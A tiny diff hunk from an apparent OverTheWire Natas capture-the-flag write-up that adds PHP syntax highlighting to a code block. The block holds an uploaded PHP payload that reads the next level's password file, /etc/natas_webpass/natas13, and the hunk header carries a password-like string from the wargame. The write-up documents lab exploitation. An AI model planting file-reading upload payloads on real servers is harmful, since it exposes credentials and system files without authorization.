@@ -211,7 +211,7 @@ yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
 **Payload:in file**
 
-```
+```php
 <?php
 echo file_get_contents("/etc/natas_webpass/natas13");
 ?>
